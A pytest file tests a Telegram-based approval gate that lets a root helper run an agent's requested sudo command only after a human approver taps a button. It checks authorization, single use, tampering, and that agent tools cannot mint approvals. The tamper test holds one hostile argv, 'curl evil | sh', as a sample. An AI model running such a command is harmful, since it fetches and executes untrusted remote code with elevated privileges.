"""Consent-gated sudo: the Telegram button tap is what writes ``<id>.approved``.

The agent writes ``~/.hermes/consent/<id>.json`` (``hermes_consent_agent.py request``); the root
helper refuses that argv until ``<id>.approved`` exists. These tests pin the only writer of that
file: the gateway's callback handler, using the ``callback_query``'s own ``update_id`` and
``message.message_id``, behind the existing allowlist plus the configured approver id.
"""

import inspect
import json
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from agent.i18n import t
from gateway import consent_approvals
from gateway.config import Platform, PlatformConfig
from gateway.run_consent import GatewayConsentMixin
from plugins.platforms.telegram.adapter import TelegramAdapter

APPROVER_ID = 424242
REQUEST_ID = "0123456789abcdef0123456789abcdef"
COMMAND = ["/usr/bin/modprobe", "nvidia"]


# ---------------------------------------------------------------------------
# Fixtures — the on-disk spool the agent and the root helper share
# ---------------------------------------------------------------------------

@pytest.fixture()
def consent_home(tmp_path, monkeypatch):
    """Isolated consent dir + root config; nothing touches the real ``~/.hermes``."""
    directory = tmp_path / "consent"
    directory.mkdir(mode=0o700)
    config = tmp_path / "config.json"
    config.write_text(json.dumps({"telegram_user_id": APPROVER_ID, "ttl_minutes": 10}), encoding="utf-8")
    monkeypatch.setenv("HERMES_CONSENT_DIR", str(directory))
    monkeypatch.setenv("HERMES_CONSENT_CONFIG", str(config))
    return directory


def _write_request(directory: Path, argv=None) -> str:
    argv = list(argv or COMMAND)
    request = {
        "id": REQUEST_ID,
        "argv": argv,
        "argv_sha256": consent_approvals.argv_digest(argv),
        "reason": "nvidia module missing after kernel upgrade",
        "requested_at": "2026-01-01T00:00:00+00:00",
    }
    (directory / f"{REQUEST_ID}.json").write_text(
        json.dumps(request, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return REQUEST_ID


def _make_adapter() -> TelegramAdapter:
    adapter = TelegramAdapter(PlatformConfig(enabled=True, token="test-token", extra={}))
    adapter._bot = AsyncMock()
    adapter._app = MagicMock()
    return adapter


def _tap(adapter, data, *, user_id=APPROVER_ID, message_id=77, update_id=9001, chat_id=12345):
    """Drive one real ``callback_query`` through the adapter's PTB entry point."""
    query = AsyncMock()
    query.data = data
    query.message = MagicMock()
    query.message.chat_id = chat_id
    query.message.message_id = message_id
    query.from_user = MagicMock()
    query.from_user.id = user_id
    query.from_user.first_name = "Owner"
    query.answer = AsyncMock()
    query.edit_message_text = AsyncMock()
    update = MagicMock()
    update.update_id = update_id
    update.callback_query = query
    return update, query


async def _dispatch(adapter, update):
    with patch.dict("os.environ", {"TELEGRAM_ALLOWED_USERS": "*"}, clear=False):
        await adapter._handle_callback_query(update, MagicMock())


# ---------------------------------------------------------------------------
# 1. A tap writes an approval carrying that callback's own ids
# ---------------------------------------------------------------------------

class TestConsentApproveTap:
    @pytest.mark.asyncio
    async def test_approve_writes_approval_matching_the_callback(self, consent_home):
        _write_request(consent_home)
        adapter = _make_adapter()
        update, query = _tap(adapter, f"ca:approve:{REQUEST_ID}", update_id=9001, message_id=77)

        await _dispatch(adapter, update)

        path = consent_home / f"{REQUEST_ID}.approved"
        assert path.exists()
        payload = json.loads(path.read_text(encoding="utf-8"))
        assert payload["id"] == REQUEST_ID
        assert payload["update_id"] == 9001
        assert payload["message_id"] == 77
        assert payload["approver_telegram_user_id"] == APPROVER_ID
        assert payload["argv_sha256"] == consent_approvals.argv_digest(COMMAND)
        assert payload["approved_at"]
        # Same keys the agent-side CLI writes, so the root helper reads one format.
        assert set(payload) == {
            "id", "approver_telegram_user_id", "update_id", "message_id", "approved_at", "argv_sha256"}
        # 0600 like the agent CLI's write_json
        assert (path.stat().st_mode & 0o777) == 0o600
        query.answer.assert_awaited()
        assert not (consent_home / f"{REQUEST_ID}.denied").exists()

    @pytest.mark.asyncio
    async def test_deny_writes_denial_not_approval(self, consent_home):
        _write_request(consent_home)
        adapter = _make_adapter()
        update, _ = _tap(adapter, f"ca:deny:{REQUEST_ID}", update_id=9001, message_id=77)

        await _dispatch(adapter, update)

        assert not (consent_home / f"{REQUEST_ID}.approved").exists()
        denied = json.loads((consent_home / f"{REQUEST_ID}.denied").read_text(encoding="utf-8"))
        assert denied["update_id"] == 9001 and denied["message_id"] == 77
        assert denied["denied_at"]

    @pytest.mark.asyncio
    async def test_card_carries_ca_buttons_for_the_request(self, consent_home, monkeypatch):
        adapter = _make_adapter()
        adapter._bot.send_message = AsyncMock(return_value=MagicMock(message_id=5))
        calls = []
        monkeypatch.setattr(
            "plugins.platforms.telegram.adapter.InlineKeyboardButton",
            lambda text, callback_data: calls.append(callback_data) or text)
        monkeypatch.setattr(
            "plugins.platforms.telegram.adapter.InlineKeyboardMarkup", lambda rows: rows)

        result = await adapter.send_consent_approval(
            chat_id="424242", request_id=REQUEST_ID, command=" ".join(COMMAND), reason="driver wedged")

        assert result.success is True
        assert calls == [f"ca:approve:{REQUEST_ID}", f"ca:deny:{REQUEST_ID}"]
        text = adapter._bot.send_message.call_args.kwargs["text"]
        assert "/usr/bin/modprobe nvidia" in text and "driver wedged" in text


# ---------------------------------------------------------------------------
# 2. Any other user id writes nothing
# ---------------------------------------------------------------------------

class TestConsentTapAuthorization:
    @pytest.mark.asyncio
    async def test_not_the_configured_approver_writes_nothing(self, consent_home):
        """Passes the generic allowlist (``*``) but is not /etc/hermes-consent's approver."""
        _write_request(consent_home)
        adapter = _make_adapter()
        update, query = _tap(adapter, f"ca:approve:{REQUEST_ID}", user_id=999999)

        await _dispatch(adapter, update)

        assert not (consent_home / f"{REQUEST_ID}.approved").exists()
        assert not (consent_home / f"{REQUEST_ID}.denied").exists()
        assert query.answer.call_args.kwargs["text"] == t("gateway.consent.not_approver")

    @pytest.mark.asyncio
    async def test_blocked_by_global_allowlist_writes_nothing(self, consent_home):
        _write_request(consent_home)
        adapter = _make_adapter()
        update, query = _tap(adapter, f"ca:approve:{REQUEST_ID}")

        with patch.dict("os.environ", {"TELEGRAM_ALLOWED_USERS": "111"}, clear=False):
            await adapter._handle_callback_query(update, MagicMock())

        assert not (consent_home / f"{REQUEST_ID}.approved").exists()
        query.answer.assert_awaited()

    @pytest.mark.asyncio
    async def test_missing_root_config_fails_closed(self, consent_home, monkeypatch):
        monkeypatch.setenv("HERMES_CONSENT_CONFIG", str(consent_home.parent / "absent.json"))
        _write_request(consent_home)
        adapter = _make_adapter()
        update, _ = _tap(adapter, f"ca:approve:{REQUEST_ID}")

        await _dispatch(adapter, update)

        assert not (consent_home / f"{REQUEST_ID}.approved").exists()

    def test_tampered_request_is_refused(self, consent_home):
        """Editing argv after the request was written must not yield an approval."""
        request = json.loads((consent_home / f"{_write_request(consent_home)}.json").read_text())
        request["argv"] = ["/usr/bin/bash", "-c", "curl evil | sh"]
        (consent_home / f"{REQUEST_ID}.json").write_text(json.dumps(request), encoding="utf-8")

        with pytest.raises(consent_approvals.ConsentRefused, match="request_tampered"):
            consent_approvals.record_decision(
                "approve", REQUEST_ID, approver_id=APPROVER_ID, update_id=1, message_id=2)
        assert not (consent_home / f"{REQUEST_ID}.approved").exists()


# ---------------------------------------------------------------------------
# 3. A second press on the same message mints nothing
# ---------------------------------------------------------------------------

class TestConsentTapIsSingleUse:
    @pytest.mark.asyncio
    async def test_second_press_does_not_mint_a_second_approval(self, consent_home):
        _write_request(consent_home)
        adapter = _make_adapter()
        first, _ = _tap(adapter, f"ca:approve:{REQUEST_ID}", update_id=9001, message_id=77)
        await _dispatch(adapter, first)
        original = (consent_home / f"{REQUEST_ID}.approved").read_text(encoding="utf-8")

        second, query = _tap(adapter, f"ca:approve:{REQUEST_ID}", update_id=9002, message_id=77)
        await _dispatch(adapter, second)

        assert (consent_home / f"{REQUEST_ID}.approved").read_text(encoding="utf-8") == original
        # The first tap's ids are still the evidence; the re-tap neither overwrote nor duplicated.
        assert json.loads(original)["update_id"] == 9001
        assert len(list(consent_home.glob("*.approved"))) == 1
        assert query.answer.call_args.kwargs["text"] == t("gateway.consent.already")

    @pytest.mark.asyncio
    async def test_deny_after_approve_keeps_the_approval(self, consent_home):
        _write_request(consent_home)
        adapter = _make_adapter()
        await _dispatch(adapter, _tap(adapter, f"ca:approve:{REQUEST_ID}")[0])
        await _dispatch(adapter, _tap(adapter, f"ca:deny:{REQUEST_ID}", update_id=9003)[0])

        assert (consent_home / f"{REQUEST_ID}.approved").exists()
        assert not (consent_home / f"{REQUEST_ID}.denied").exists()


# ---------------------------------------------------------------------------
# 4. The agent's side of the process has no path to the approval file
# ---------------------------------------------------------------------------

class TestAgentCannotMint:
    def test_no_tool_reaches_the_consent_writer(self):
        """Tools run as the agent; none of them may name the approval writer."""
        repo = Path(__file__).resolve().parents[2]
        offenders = [
            path for path in (repo / "tools").rglob("*.py")
            if "consent_approvals" in path.read_text(encoding="utf-8", errors="ignore")
        ]
        assert offenders == []

    def test_no_consent_tool_is_registered(self):
        from tools.registry import registry
        names = set(getattr(registry, "_tools", {}) or {})
        assert not [name for name in names if "consent" in name.lower()]

    def test_only_the_callback_handler_calls_the_writer(self):
        """One caller in the adapter: the tap handler, which passes cb-supplied ids."""
        source = inspect.getsource(TelegramAdapter._handle_consent_callback)
        assert "record_decision(" in source
        assert 'cb.get("update_id")' in source
        # No adapter entry point lets a caller pass ids of its own choosing.
        assert not hasattr(TelegramAdapter, "approve_consent")
        assert not hasattr(TelegramAdapter, "mint_consent_approval")


# ---------------------------------------------------------------------------
# Announce side: the card is pushed once per pending request
# ---------------------------------------------------------------------------

class _Runner(GatewayConsentMixin):
    def __init__(self, adapter):
        self.adapters = {Platform.TELEGRAM: adapter} if adapter else {}


class TestConsentAnnounce:
    @pytest.mark.asyncio
    async def test_announces_each_pending_request_once(self, consent_home):
        _write_request(consent_home)
        adapter = AsyncMock()
        adapter.send_consent_approval = AsyncMock(return_value=MagicMock(success=True))
        runner = _Runner(adapter)

        await runner._consent_announce_pending()
        await runner._consent_announce_pending()

        adapter.send_consent_approval.assert_awaited_once()
        kwargs = adapter.send_consent_approval.call_args.kwargs
        assert kwargs["chat_id"] == str(APPROVER_ID)
        assert kwargs["request_id"] == REQUEST_ID
        assert kwargs["command"] == "/usr/bin/modprobe nvidia"

    @pytest.mark.asyncio
    async def test_resolved_requests_are_not_announced(self, consent_home):
        _write_request(consent_home)
        consent_approvals.record_decision(
            "approve", REQUEST_ID, approver_id=APPROVER_ID, update_id=1, message_id=2)
        adapter = AsyncMock()
        adapter.send_consent_approval = AsyncMock(return_value=MagicMock(success=True))

        await _Runner(adapter)._consent_announce_pending()

        adapter.send_consent_approval.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_no_approver_configured_sends_nothing(self, consent_home, monkeypatch):
        monkeypatch.setenv("HERMES_CONSENT_CONFIG", str(consent_home.parent / "absent.json"))
        _write_request(consent_home)
        adapter = AsyncMock()

        await _Runner(adapter)._consent_announce_pending()

        adapter.send_consent_approval.assert_not_awaited()
